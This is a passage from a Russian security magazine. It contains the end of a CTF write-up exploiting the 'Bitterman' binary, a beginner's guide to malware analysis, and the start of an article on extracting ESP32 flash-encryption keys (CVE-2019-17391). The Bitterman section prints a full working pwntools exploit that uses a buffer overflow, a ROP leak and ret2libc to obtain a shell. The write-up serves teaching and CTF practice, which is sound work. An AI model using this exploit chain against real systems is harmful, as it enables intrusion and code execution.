   ‐‐ Welcome to IDA 10.0.
  [0x00400590]> aaa
  [x] Analyze all flags starting with sym. and entry0 (aa)
  [x] Analyze function calls (aac)
  [x] Analyze len bytes of instructions for references (aar)
  [x] Constructing a function name for fcn.* and sym.func.* functions
  (aan)
  [x] Type matching analysis for all functions (aaft)
  [x] Use ‐AA or aaaa to perform additional experimental analysis.
  [0x00400590]> pdf @ main
  ...





         Дизассемблируем Bitterman в Radare2 (кликабельно)

Спойлер: красным выделена уязвимая функция ввода.
   Если у тебя нет возможнос ти приобрести IDA Pro (а пиратство мы не одоб‐
ряем), можешь использовать для декомпиляции инс трумент Ghidra, который
АНБ так любезно подарило прос тым смертным.





                Реверс‐инженерим Bitterman в Ghidra

Если посмотреть на псевдокод функций main и read_nbytes, можно сос‐
тавить такой исходник на псевдо‐C, который будет отражать поведе ние
Bitterman.


// bitterman.c


int read_nbytes(char *dst,size_t nbytes) {
  int iVar1;
  ssize_t sVar2;
  long lVar3;
  int i;


  i = 0;
  while( true ) {
    if (nbytes <= (ulong)(long)i) {
      return i;
    }
    sVar2 = read(0,dst + i,1);
    if (sVar2 == 0) break;
    iVar1 = i + 1;
    lVar3 = (long)i;
    i = iVar1;
    if (dst[lVar3] == '\n') {
      return iVar1;
    }
  }
  return i;
}


int main(int argc,char **argv) {
  int iVar1;
  size_t nbytes;
  char buf [64];
  char username [64];
  size_t size;


  puts("> What\'s your name? ");
  fflush(stdout);
  read_nbytes(username,0x40);
  printf("Hi, %s\n",username);
  puts("> Please input the length of your message: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_004008c4,&nbytes);
  puts("> Please enter your text: ");
  fflush(stdout);
  iVar1 = read_nbytes(buf,nbytes);  // <‐‐ УЯЗВИМЫЙ КОД
  if (iVar1 != 0) {
    puts("> Thanks!");
    fflush(stdout);
  }
  return 0;
}

Второй вызов read_nbytes про исходит с подконтрольным нам значением
количества байтов, которые нужно считать, а раз мер буфера фиксирован —
64 байта. Уверен, ты уже понял, что нуж но делать!


Динамический анализ
Запустим отладчик и рассчитаем точку переза писи RIP с помощью цикличес‐
кого паттерна.





               Кормим Bitterman паттерном де Брёйна

Генерим строку в 500 символов и скармливаем программе через уязвимый
input.





                      Считаем офсет до RIP

Итак, нам нужно 152 байта для того, что бы добраться до адреса возврата.


Темная магия pwntools
Вектор атаки точ но такой же, как в тренировочном кейсе номер три, и, чтобы
не повторяться с почти таким же кодом эксплоита, я покажу, как pwntools поз‐
воляет практически полностью автоматизировать действия нарушителя.
   Чтобы немного разнооб разить наш девелоп мент, с помощью socat под‐
весим процесс Bitterman к localhost на порт 10103 (оригинальность тас ка сох‐
ранена), чтобы можно было подключаться к нему через сокет из соседнего
терминала.



  $ socat TCP‐LISTEN:10103,reuseaddr,fork EXEC:./bitterman


Из‐за этого нововведения я буду обра щаться к процессу с помощью функции
pwnlib.tubes.remote, а не pwnlib.tubes.process, как раньше.


Фаза 1. Return-to-PLT
Разберем будущий сплоит по частям. В первой фазе (Return‐to‐PLT), как ты
помнишь, мы искали нужные гаджеты для того, чтобы узнать реальный адрес
функции puts.


# ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ Фаза 1. Return‐to‐PLT ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐


bitterman = ELF('./bitterman')
rop = ROP(bitterman)


log.info('Фаза 1. Return‐to‐PLT')
rop.puts(bitterman.got['puts'])
log.success('Найдены адреса puts (PLT & GOT)')
rop.call(bitterman.symbols['main'])
log.success('Найден адрес main')
log.info('ROP:\n' + rop.dump())


junk = 'A' * (cyclic_find(unhex('6261616f')[::‐1]) ‐ 4) # 'A' * 152
log.success('Вычислено смещение последовательности де Брёйна: %s' %
len(junk))


payload = junk + str(rop)


r = remote('localhost', '10103')
#p = process('./bitterman')


"""
gdb.attach(p, '''
init‐peda
start''')
"""


r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад?')
r.sendline(payload)
r.recvuntil('Thanks!')
received = r.recvuntil('What\'s your name?')[:8].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('Слитый адрес puts@GLIBC: %s' % hex(leaked_puts))

В pwntools есть специальный класс ROP, который найдет за тебя все, что душе
угодно (разумеется, в рамках разумного).


rop.puts(bitterman.got['puts'])
rop.call(bitterman.symbols['main'])

Этими двумя строками я инициализирую ROP‐цепочку тремя гаджетами: инс‐
трукции pop rdi; ret (находятся авто матичес ки — даже ничего не нужно
указывать в явном виде!), вызов puts с «самим собой» в качестве аргумента
(чтобы стриггерить утечку адреса) и вызов main.


junk = 'A' * (cyclic_find(unhex('6261616f')[::‐1]) ‐ 4) # 'A' * 152

А здесь я на лету высчитываю нуж ный размер «мусорной» строки (помним, что
он равен 152 байтам). Правда, чтобы это сработа ло, нужно скормить Bitter‐
man циклический паттерн, который генерирует pwntools (а не PEDA — они
различаются), и узнать четыре младших бай та, лежащие в RSP (как мы делали
уже не один раз).
   Сгенерировать паттерн, который предлага ет pwntools, можно с помощью
такой простой команды.



  $ python2 ‐c 'import pwn; print pwn.cyclic(500)'


После чего я взаимо действую с уда лен ным про цес сом: отправляю пейлоад
и извлекаю «слитый» адрес puts.


Фаза 2. Return-to-libc
Во второй фазе мы проворачиваем уже зна комую тебе атаку Return‐to‐libc,
которая также отлично поддается автомати зации.


# ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ Фаза 2. Return‐to‐libc ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐


libc = ELF('/usr/lib/x86_64‐linux‐gnu/libc.so.6')
libc.address = leaked_puts ‐ libc.symbols['puts']
rop2 = ROP(libc)


log.info('Фаза 2. Return‐to‐libc')
rop2.system(next(libc.search('/bin/sh\x00')))
log.success('Составлен пейлоад для атаки ret2libc')
log.info('ROP2:\n' + rop2.dump())


payload2 = junk + str(rop2)


#r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад2?')
r.sendline(payload2)
r.recvuntil('Thanks!')
r.clean()


r.interactive()

Остановимся на самых интерес ных моментах.


libc.address = leaked_puts ‐ libc.symbols['puts']

Здесь я присваиваю объекту  libc реальный адрес загрузки библиотеки
(полученный в первой фазе), чтобы pwntools знал, где искать либу.


rop2.system(next(libc.search('/bin/sh\x00')))

А после создаю второй объект класса ROP и наполняю его снова тремя гад‐
жетами: инструк ции pop  rdi;  ret, адрес строки /bin/sh и вызов биб‐
лиотечной функции system. Для это го мне нужна всего одна строка.
   Вот полный код экспло ита.


#!/usr/bin/env python
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python exploit.py [DEBUG]


from pwn import *


context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new‐window']


# ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ Фаза 1. Return‐to‐PLT ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐


bitterman = ELF('./bitterman')
rop = ROP(bitterman)


log.info('Фаза 1. Return‐to‐PLT')
rop.puts(bitterman.got['puts'])
log.success('Найдены адреса puts (PLT & GOT)')
rop.call(bitterman.symbols['main'])
log.success('Найден адрес main')
log.info('ROP:\n' + rop.dump())


junk = 'A' * (cyclic_find(unhex('6261616f')[::‐1]) ‐ 4) # 'A' * 152
log.success('Вычислено смещение последовательности де Брёйна: %s' %
len(junk))


payload = junk + str(rop)


r = remote('localhost', '10103')
#p = process('./bitterman')


"""
gdb.attach(p, '''
init‐peda
start''')
"""


r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад?')
r.sendline(payload)
r.recvuntil('Thanks!')
received = r.recvuntil('What\'s your name?')[:8].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('Слитый адрес puts@GLIBC: %s' % hex(leaked_puts))


# ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ Фаза 2. Return‐to‐libc ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐


libc = ELF('/usr/lib/x86_64‐linux‐gnu/libc.so.6')
libc.address = leaked_puts ‐ libc.symbols['puts']
rop2 = ROP(libc)


log.info('Фаза 2. Return‐to‐libc')
rop2.system(next(libc.search('/bin/sh\x00')))
log.success('Составлен пейлоад для атаки ret2libc')
log.info('ROP2:\n' + rop2.dump())


payload2 = junk + str(rop2)


#r.recvuntil('What\'s your name?')
r.sendline('snovvcrash')
r.recvuntil('Please input the length of your message:')
r.sendline('31337')
r.recvuntil('Please enter your text:')
r.clean()
raw_input('[?] Отправляю пейлоад2?')
r.sendline(payload2)
r.recvuntil('Thanks!')
r.clean()


r.interactive()

Выпол ним то, что мы натворили, и получим наконец свой шелл.





                         Bitterman has been PWNed!

На этом все с Bitterman. В четвертой (и заключитель ной) час ти серии мы раз‐
берем тачку Smasher с Hack The Box, изю минкой прохождения которой стал
низкоуровневый сплоитинг веб‐сервера.


        WWW

                      Весь код, используемый в серии «В королевстве
                     PWN», можно найти в репозитории на GitHub.
ВЗЛОМ

  ПОСМОТРИ
   В ГЛАЗА
   МАЛВАРИ





          ГАЙД ПО РАБОТЕ
     С ВРЕДОНОСНЫМИ ФАЙЛАМИ
          ДЛЯ НОВИЧКОВ




Если   ты    когда‐нибудь   сталкивался
с вирусом, то наверняка помнишь, что впе‐
чатления не из приятных. Но есть способы
поймать  и  препарировать  вредоносную
программу. Именно этим и занимаются         Константин Асеев                                                                                   Главный инженер Центра
вирусные аналитики. Сегодня я познаком‐       киберзащитыСбербанка(Blue Team)
лю тебя с азами этой работы. Мы пройдем‐         aseev.kostya@gmail.com
ся  по всем основным  эта пам  ана лиза
и посмотрим, как пользоваться профес‐
сиональными инс трументами. Я постара‐
юсь по дороге объяснять основную тер‐
минологию.


ПЕРВЫЕ ШАГИ
Итак, представим для начала, что у нас на руках зараженная машина. Первым
делом нужно выполнить три основных действия: изолировать компьютер
от других в сети, сделать дамп памяти и снять образ диска.
  При отключении зараженного компь ютера от сети стоит помнить, что если
мы имеем дело с вирусом‐шифровальщиком, то есть шанс потерять поль‐
зовательские данные. Малварь может начать шифровать их, когда прервется
соединение с сетью, поэто му первым делом оцени, насколько важны данные
на зараженном ПК и стоит ли рисковать.
   Лучше всего будет создать для карантина виртуальную сеть (VLAN)
с выходом в интернет и переместить туда зараженные ПК. В крупной ком‐
пании это потребует слаженных действий сот рудников службы кибербезопас‐
ности и сетевых администраторов, в мел кой — разноплановых навыков
единственного сисадмина.
   Дальше необходимо снять дамп памяти. Делается это с самого начала,
потому что при копиро вании жес ткого диска потребуется выключить компь‐
ютер и содержимое оперативной памяти будет потеряно. Программу, сни‐
мающую  дамп,  лучше  всего  запускать  с  внешнего  носителя,  чтобы
не оставлять лишних следов на жестком диске — данные с него понадобятся
нам в неизмененном виде.
   Чтобы малварь не успела среагировать на выключение системы, проще
всего выдернуть кабель питания. Метод, конечно, варварский, зато гаран‐
тирует моментальное отключение. Сохранить данные на жестком диске нет‐
ронутыми для нас важнее, чем беспокоиться об исправности других ком‐
понентов.
   Дальше запустим ПК, используя загрузочный носитель с любой операци‐
онной системой в режиме forensic и ПО для получения образа жесткого дис‐
ка. Чаще всего используется образ диска в формате E01 (Encase Image File
Format). Его поддерживает большое число приложений как для Windows, так
и для Linux.


             INFO

                     Режим forensic — это загрузка без монтирова ния
                      физических дисков. Это позволяет исключить
                       внесение любых изменений в исследуемый диск.
                     Профессиональные криминалисты также исполь‐
                       зуют  устройства,  позволяющие  заб локировать
                    любые попытки обращения к диску для записи.



ИЗУЧЕНИЕ ДАМПОВ
Дампы памяти и диска, скорее всего, содержат всё, что нам необ ходимо, —
тело вредоносной программы и оставлен ные ей следы. Можем приступать
к поиску.
  Я рекомендую начинать с изу чения копии диска, а дамп памяти исполь‐
зовать, если на диске не удас тся обнаружить никаких следов либо как допол‐
нительный источник. При анализе содержимого диска в первую очередь
обращаем внимание на автозагрузку, планировщик задач и начальный сектор
загрузки диска.


        WWW

                     На сайте Microsoft есть документация по автозаг‐
                        рузке сервисов и библиотек.


Чтобы понять, каким путем малварь проникла на компьютер, стоит иссле‐
довать время создания и изменения фай лов на диске, историю браузера
и почтовый архив пользователя. Если получится уста новить хотя бы при мер‐
ное время заражения, то это будет плю сом. В интернете есть неплохие под‐
борки путей в файловой системе и реес тре, на которые стоит обращать вни‐
мание в первую оче редь (вот, например, неплохая статья Group‐IB об этом).
  Из дампа памяти  ты тоже можешь  извлечь  некоторую  уникальную
информацию, например какие были открыты документы и вкладки браузера
в момент зараже ния, какие были активные сетевые подключения, рабочие
процессы (в том числе скрытые).


АНАЛИЗ ФАЙЛА
Когда у тебя на руках окажется файл, вызыва ющий подоз рения, нужно будет
как‐то удостовериться, что это и есть экземпляр вредоносной программы.
Конечно, если это извес тный вирус, то его можно выявить антивирусом (для
проверки сразу всеми антивирус ными движками есть сайт virustotal.com).
Но все чаще попадаются уникальные случаи, не детектируемые антивирус‐
ными программами. Такие вредоносные программы име ют статус FUD (Fully
UnDetectable).
   Также нельзя исключать, что ты столкнулся с угрозой нулевого дня (0‐
day) — той, о которой еще никому не извес тно (и у разработчиков есть ноль
дней на ее устранение — отсю да и наз вание). Мал варь, которая эксплуати‐
рует зиродеи и име ет ста тус FUD, представляет серь езную угрозу не только
для отдельных компьютеров, но и для целых компаний.
  Перед началом анализа подоз рительного файла необходимо сде лать сле‐
дующее.
 1. Подготовить стенд для исследования — вир туальную машину с установ‐
   ленной операционной системой, подходящей для запуска исследуемого
  файла.
 2. Настроить выход в интернет, желательно обес печив скрытие своего
   реального IP‐адреса, чтобы не потерять связь с серверами управления
  мал вари (тебя могут рас познать как вирусного аналитика и ограничить
   доступ, чтобы скрыть какие‐то функции).
 3. Сделать снимок (snapshot) первично го сос тояния виртуальной машины.


             INFO

                    Ни в коем случае не подключай стенд в кор‐
                       поративную сеть — это может выз вать массовое
                      заражение других компьютеров.


Существует два подхода к анализу ПО — динамический и статический.
Как правило, для лучшего эффекта используют более подходящий для ситу‐
ации метод или оба метода одновременно. Например, может быть необ‐
ходимо изучить поведение вредонос ной программы, чтобы выявить харак‐
терные маркеры без анализа алго ритмов. Поэтому выбор методов и инс тру‐
ментов может меняться в ходе ана лиза.


Статический анализ
Начнем со статического анализа, пос кольку он не требует запускать вре‐
доносный код и точ но не вызовет заражения на тво ем компьютере.
   Рассмотрим начальные заголовки исполняемого файла для Windows.
 1. DOS‐заголовок файла, также извес тный как DOS‐заглушка. Благодаря ему
   возможен запуск программы в DOS (обычно всего лишь выводится над‐
   пись This program cannot be run in DOS mode). Можно увидеть начало
   заголовка по характерным буквам MZ .





                  Заголо вок исполня емого файла

 1. Сразу же за первым идет используемый современными ОС заголовок
   со всеми необходимыми параметрами для исполняемого файла (нап‐
   ример, смещение до таблицы импорта/экспорта, начало секции исполня‐
  емого кода). Начало заголовка можно найти по характерным буквам PE,
   а описание формата есть на сайте Microsoft.

Можно сказать, что заголо вок исполняемо го фай ла содержит справочник
о том, где и что именно находится внутри самого файла, какие разрешения
должны быть выданы секциям, все настройки для корректной работы, поэто‐
му анализ заголовка может дать ценную первоначаль ную информацию.
  Кроме этого, необ ходимо прос мотреть, нет ли в файлах строковых данных.
По ним можно впоследствии определять подоб ные файлы или даже получить
важную информацию вро де адресов серверов управления.
  Перед разработчиками малвари всегда стоит задача как можно сильнее
маскировать свое творение и всячески усложнять обнаружение и анализ.
Поэтому очень часто используются упаковщики для исполняемых файлов.


             INFO

                      Упаковщики ―  утилиты  для сжатия и шиф‐
                       рования  исполняемых  файлов.  Используются
                      не только создателями малвари, но и разработ‐
                      чиками легитимного ПО для защиты от взлома
                       своих программ. Самописные упаковщики, спе‐
                       циально созданные для  зат руднения анализа,
                      не всегда детектируются программами и пот‐
                       ребуют от аналитика дополнительных действий,
                         что бы снять упаковку.


Более глубокий (и в то же время слож ный) ана лиз любых исполняемых фай‐
лов ― это применение дизассемблеров. Ассемблерный код понятнее
для челове ка, чем машин ный, но из‐за объемов разобраться в нем бывает
далеко не так просто. В отдельных случаях воз можно вос становить исходный
код программ на языке высокого уровня путем декомпиляции — если удастся
определить, какой исполь зовался компилятор и алгоритм обфускации.


Сло варь тер минов
 • Дизассембле ры ― программы для перевода машин ного кода в отно‐
   сительно удобочитаемый и понят ный язык ассемблера.
 • Де компиляция — восстановление исходного кода программы на изна‐
   чальном языке программирова ния.
 • Об фускация ― изменение исходно го кода программы так, что его фун‐
   кциональность сохраняется, но сам он усложняется и в нем появляется
   ничего не добавляющий мусор.
 • Об фускаторы ― программы для автоматизации обфускации.
 • Псевдокод ― как пра вило, так называ ют неформальный язык описания
   алгоритмов, который позволяет предста вить исследуемый код на ассем‐
   блере в более читаемом виде. При переводе в псевдокод малозначимые
   элементы алгоритма отбра сываются.



Анализ кода на ассемблере ― тру доемкий процесс, который требует боль‐
ших затрат времени и хороших навыков низкоуровневого программирования,
поэтому для быстрого ана лиза можно преобразовать полученный код в псев‐
докод. Читать псевдокод более удоб но, чем ассемблер, это можно увидеть
по следующему примеру, где слева оригинальный код на ассемблере,
а справа — псев докод.





                       Код на ассемблере





                           Псевдокод


Динамический анализ
Чтение псевдокода или кода на ассемблере подоб но рас путыванию клубка
ниток — кропотливо и трудоемко. Поэтому можно воспользоваться другим
видом анализа — динамичес ким. Динамичес кий анализ подразумевает
запуск исполняемого файла и отслеживание выполняемых им действий, таких
как обращение к веткам реестра, отправка и получение данных по сети,
работа с файлами.


           WARNING

                   Динамический   анализ  предполагает   запуск
                       исследуемого файла. Это необходимо  делать
                       на виртуальной машине, изолированной от дру‐
                         гих компьютеров, чтобы избежать возможности
                       распространения вредоноса по сети.


Анализировать поведение программы можно, отсле живая и перехватывая
запуск приложе ний на уровне ОС либо подключившись к работающе му про‐
цессу и перехватывая вызовы библиотек и API. А чтобы детально разобрать
процесс выполнения  программы,  лучше  всего  вос пользоваться одним
из отладчиков.


             INFO

                     Отладчик ― утилита или набор утилит, который
                       используется  для   тестирования  и  отладки
                       целевого приложения. Отладчик может имитиро‐
                         вать работу процессора, а не запускать прог‐
                     рамму на настоящем железе. Это дает более
                      высокий  уровень  контроля  над  выполнением
                      и позволяет останавливать программу при задан‐
                      ных  условиях. Большинство  отладчиков  также
                       способны запускать выполнение исследуемого
                       кода в пошаговом режиме.


Неважно, используешь ты отладчик или какую‐то программу, которая поз‐
воляет контролировать вызовы API, — работать придется в ручном режиме.
А это значит, что потребуются углубленные зна ния опе рационной системы,
зато ты получишь самые полные данные об объекте иссле дования.
  Однако анализ можно и автоматизировать. Для этого используются так
называемые песочницы (sandbox) — тес товые среды для запус ка ПО.
  Песочницы делятся на два типа: офлайновые и онлайновые. Для получе‐
ния наиболее пол ной картины я рекомендую исполь зовать сразу несколько
источников данных и не исключать какой‐то из типов песочниц. Чем больше
информации ты соберешь, тем лучше.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ПОСМОТРИ В ГЛАЗА
          МАЛВАРИ
                ГАЙД ПО РАБОТЕ С ВРЕДОНОСНЫМИ
                     ФАЙЛАМИ ДЛЯ НОВИЧКОВ





Пример анализа
Поскольку анализ мал вари всегда упирается в практические навыки, эта
статья была бы непол ной без демонстра ции его на примере. Проведем экс‐
пресс‐анализ и установим природу исполняемого файла.
  Для начала определимся с пос ледова тельностью действий. Вот что нам
нужно сделать:
 • получить хеш‐сумму с файла;
 • воспользоваться онлайновым сервисом для проверки фай ла;
 • собрать статические данные из фай ла;
 • проверить файл в песоч нице (локальной или в интернете);
 • запустить файл в виртуальной среде для отслеживания выполняемых дей‐
   ствий;
 • снять оболочки и получить развернутый в памяти вредонос;
 • проанализировать код в дизассемблере.

Допустим, нам необходимо исследовать неизвестный файл Sample.exe.
  Для хранения файла рекомендую первым делом изменить расширение,
например на Sample._exe, чтобы избежать случайного запус ка.
  Делаем снимок (snapshot) виртуальной машины, на которой и будем
запускать исполняемый файл (изначальное сос тояние сис темы нам еще при‐
годится), и считаем хеш‐сумму файла.





                  Получение хеш‐суммы фай ла

Скопируем результат и вос пользуемся virustotal.com для проверки.





               Проверка хеш‐суммы на virustotal.com

Как можно увидеть из скриншота выше, вердикт VT ― 54 из 70. С высокой
долей вероятности это вредоносное ПО, но давай не будем на этом останав‐
ливаться и воспользуемся дру гим сервисом — Any.run.





                     Запуск файла на Any.run

Видим, что он выдает схо жий результат (смот ри в правом нижнем углу). Кро‐
ме того, можно соб рать дополнительные данные о том, что делала прог‐
рамма. А именно:
 • после старта продублировала себя в памяти;
 • обратилась к серверу 208.91.199.224 по порту 587. На платформе можно
   посмотреть сетевой дамп вза имо действия с сервером управления мал‐
   варью (их часто называют Command & Control, C2 или C&C);
 • добавила зап рет на запуск диспетчера задач;
 • скопировала себя в отдельную пользовательскую директорию;
 • добавила себя в автозагрузку.

Даже если бы вер дикт не указал на возможную угрозу, отключение диспетче‐
ра задач и добавление в автозагрузку не сулит ничего хорошего для поль‐
зователя, особенно если учесть, что все это было сделано сразу же после
запуска.
   Итак, уже два сервиса подтвердили, что это мал варь. Продол жаем. Вос‐
пользуемся инструментом под названием DIE.





                  От крываем файл с помощью DIE


        WWW

                         Detect  it easy  (DIE) ― утилита, позволяющая
                      импортировать и экспортировать список ресур‐
                          сов, извлекать манифест и версию ПО, прос‐
                      матривать  вычисления  энтропии.  Есть  воз‐
                      можность добавить свои собственные алгоритмы
                      обнаружения  или  изме нить  существующие.
                      Это делается с помощью скрип тов на языке,
                     напоминающем JavaScript.


Как можно видеть на скриншоте, малварь написана на Visual Basic. Ты легко
нагуглишь структуру программ на Visual Basic 6.0 и описание принципов их
работы. Если коротко, то запускаются они в виртуаль ной среде, а значит, нам
нужно поймать момент, когда этот код будет распакован в памяти. Также
можно проанализировать структуру фай ла и получить название проекта,
использованные формы и прочие данные.
  Другой способ узнать, что малварь написана на Visual Basic, — исполь‐
зовать CFF Explorer.


        WWW

                     CFF Explorer ― набор инструментов с единым
                     минималистичным интерфейсом, который  поз‐
                       воля ет  просматривать  и  при  необ ходимости
                       редактировать все сек ции заголовка исполняемо‐
                         го файла. Здесь же можно увидеть импорты
                      и экспорты функций  из биб лиотек, перечень
                      самих библиотек и адресацию сек ций.





                Таблица импорта файла в CFF Explorer

В этом случае мы увидим характерную импортированную библиотеку — ее
наличие говорит о том, что используются функции Visual Basic.
  Следующим шагом запус каем Hiew и, перей дя на начало исполняемого
кода, обнаруживаем вызов функции из биб лиотеки.


        WWW

                       Hiew ― редак тор двоичного кода со встроенным
                       дизассемблером для x86, x86‐64 и ARM. Также
                    им можно открывать физические и логические
                      диски как файл. Hiew ― «легковесная» (в отличие
                         от IDA) и при этом очень мощная прог рамма,
                        которая позволяет составить первое впечатление
                      об исследуемом объ екте.





                Просмотр содержимого в файле Hiew

На данном этапе нам достаточно знать, что при запуске будет исполняться
код на Visual Basic.
  Пришло вре мя попробовать вытащить код и зафиксировать поведение
при запуске. Для это го нам потребуется при готовленная виртуальная машина
с Windows, Process Dump и API Monitor.


        WWW

                         API Monitor ― программа, которая позволяет
                       контролировать вызовы фун кций API приложе‐
                     ниями и сервисами в Windows, перехватывает
                    информацию о запуске приложе ний или подклю‐
                         чается к выполняемому процессу, чтобы прос‐
                       мотреть используемые библиотеки и вызовы API.


В API Monitor запускаем Sample.exe и получаем следующую картину: стартует
еще один процесс, после чего первый завершается, далее программа добав‐
ляется в автозагрузку.





         Просмотр API‐вызовов фай ла при помощи API Monitor

Находим указанный исполняемый файл, это первоначальный файл, записан‐
ный в директорию пользователя.





    Обнаружили копию в автозаг рузке, на диске, открываем файл в DIE

Программа еще и отключает воз можность вызвать диспетчер задач.





         Просмотр API‐вызовов фай ла при помощи API Monitor

Этого уже вполне достаточно, чтобы с уверенностью сказать, что файл вре‐
доносный.
  Выгрузим из оперативной памяти работающий процесс. Вос пользуемся
утилитой для выгрузки дампа процесса ― Process Dump. PID берем из данных
API Monitor, он отоб ражается рядом с именем процес са.





               Использование утилиты Process Dump

В результате будут выгружены все библиотеки, которые использует при ложе‐
ние. Также обнаруживаем, что в адресном прос транстве, кроме основного
исполняемого файла, есть еще и спря танные, это мож но уви деть ниже, в име‐
ни файла есть слово hiddenmodule.





               Результат работы утилиты Process Dump

Проверяем каждый полученный исполня емый файл в DIE.





                  От крываем каждый файл в DIE

Видим, что два из трех файлов написа ны на C++, а один на VB.NET.
  Обратим внимание на приложение, написанное на VB.NET. Его можно
открыть любым отладчиком для работы с .NET, например dnSpy. И мы получим
читаемый код на Visual Basic, оста лось только убрать обфускацию. В данном
случае  алгоритм  усложнили,  добавив  множес тво  переходов  по  коду
при помощи команды GoTo.





                     Просмотр кода в dnSpy

Для анализа двух оставшихся файлов воспользуемся дизас сембле ром IDA.


        WWW

                        IDA ― популярный интерак тивный дизассемблер
                     компании Hex‐Rays. Име ет бесплатную и проб‐
                     ную версии, чего вполне достаточно для пер‐
                       вичного знакомства. Так же компания выпускает
                       версию  Pro. Основная  задача  прог раммы ―
                        это перевод исполня емых файлов из бинарного
                      вида в читаемый код на ассемблере.





                      Просмотр кода в IDA

Как видно из примера, IDA поз воляет получить код программы на ассембле‐
ре, но для более удоб ного просмотра и пер воначальной оценки можно вос‐
пользоваться плагином Snowman и получить псевдокод.





                    Просмотр псевдокода в IDA

Использование псевдокода упрощает анализ, но не всегда дает ожидаемый
результат. Дизассемблирование и создание псевдокода выполняются авто‐
матически, и у вирусописателей есть техники для их усложне ния. Такое вот
вечное  противостояние  меча  и  щита,  интеллекта  соз дателя  малвари
и интеллекта вирусного аналитика.
  Мы, когда использовали API Monitor, уже выяви ли вре доносную сущность
этого файла по совершаемым действиям. Но пока что не знаем, каков потен‐
циал этой малвари. Что бы получить полный алгоритм работы этого исполня‐
емого файла, необходимо углубляться в ана лиз как ассемблерного кода, так
и программы на Visual Basic, но это выходит за рамки статьи.


ЗАКЛЮЧЕНИЕ
Если у тебя создалось впечатление, что мы бросили исследование в самом
начале пути, то оно отчасти спра ведливо: здесь мы проделали лишь те дей‐
ствия, которые не требуют знания ассемблера. Однако, как видишь, провести
экспресс‐анализ и установить, чего мож но ждать от мал вари, впол не реально
и без этого.
  При полноценном же раз боре потребуется глу бокое понимание прин‐
ципов работы операционной системы и, конечно, зна ние ассемблера.
   Если ты серьезно решил встать на путь вирус ного аналитика, то тебе
поможет литература по reverse engineering, анализу мал вари, сис темному
программированию и ассемблеру,  а  также  практика, много  практики.
Рекомендую решать крэкми и зарегистри роваться на hybrid‐analysis.com
для получения примеров работа ющих вредоносов. Тебя ждет долгий путь,
но дорогу осилит идущий!


Полез ные матери алы
 • «Шпаргалка по основным инс трукциям ассемблера x86/x64»
 • «Введение в реверсинг с нуля» Рикардо Нарвахи (есть перевод на рус‐
   ский)
 • Reverse Engineering Using Radare2
 • Radare2 Book
 • Книга Practical Malware Analysis: The Hands‐On Guide to Dissecting Malicious
   Software
 • Книга «Ассем блер и дизассемблирование»
 • Memory Forensics and Analysis Using Volatility
 • «Разбор Memory Forensics с OtterCTF и знакомство с фреймворком Volatili‐
    ty»
 • Malware Researcher’s Handbook (Demystifying PE File)
 • «Сигнатурные дела: ана лиза тор файлов и антивирус — своими руками»
ВЗЛОМ

ВЗЛАМЫВАЕМ
       ESP32
                 РАЗ И НАВСЕГДА

                 ИЗВЛЕЧЕНИЕ КЛЮЧЕЙ
               ФЛЕШ‐ШИФРОВАНИЯ
            И БЕЗОПАСНОЙ ЗАГРУЗКИ





                                                                                        LimitedResults





Свое масштабное исследова ние микроконтроллера ESP32 я
закончил изучением двух его важ нейших фун кций: безопас‐
ной загрузки (Secure Boot) и флеш‐шифрования (Flash En‐
cryption). Моей целью было получить рабочий эксплоит,
который обходит и то и другое. В этой статье я покажу,
как полностью счи тать защищенные eFuses, в которых хра‐
нятся секретные ключи.


Первый ключ исполь зуется для флеш‐шифрования (BLK1),  второй —
для безопасной загрузки (BLK2). Посколь ку вендор не может выпустить патч,
который предотвратит подобную ата ку на уже выпущенных устройствах,
это «пожизненный» взлом. Совмес тно с вен дором Espressif мы решили пойти
на ответственное раскрытие обнаруженной уяз вимос ти (CVE‐2019‐17391).


             INFO

                      Это перевод статьи пентестера с псевдонимом
                           LimitedResults, впервые опубликованной в его
                      блоге. Перевела Алёна Геор гиева. Все иллюстра‐
                      ции в статье принад лежат автору.
                          Статья  завершает  цикл  публикаций  Pwn
                       the ESP32. Предыдущие статьи читай в блоге
                        автора (на английском):
                    •Pwn the ESP32 crypto‐core
                    •Pwn the ESP32 Secure Boot



ОДНОКРАТНО ПРОГРАММИРУЕМЫЕ ПРЕДОХРАНИТЕЛИ
Однократно программируемая (One‐Time Programmable, OTP) память —
это тип энергонезависимой памяти, в которую можно записать данные только
один раз. Записав однажды, их уже нельзя изменить — после отключения
питания данные все равно оста ются на носителе. В ESP32 такая память
базируется на технологии eFuses (electronic Fuses) — и хранит системные
параметры, настрой ки безопасности и конфиденциальные данные.
  По сути eFuse — это один бит энергонеза висимой памяти; единожды
получив значение 1, он уже никогда не поменяет его на 0. Контроллер eFuses
программным методом присваивает каж дому биту необходимый системный
параметр. Некоторые из этих парамет ров либо счи тываются софтом через
контроллер eFuses, либо используются железом напрямую. Часть таких элек‐
тронных предохраните лей защищают дос туп к чтению и записи данных.


Кон трол лер eFuses на ESP32
Espressif пре доставляет полную документацию по технологии eFuse. В тех‐
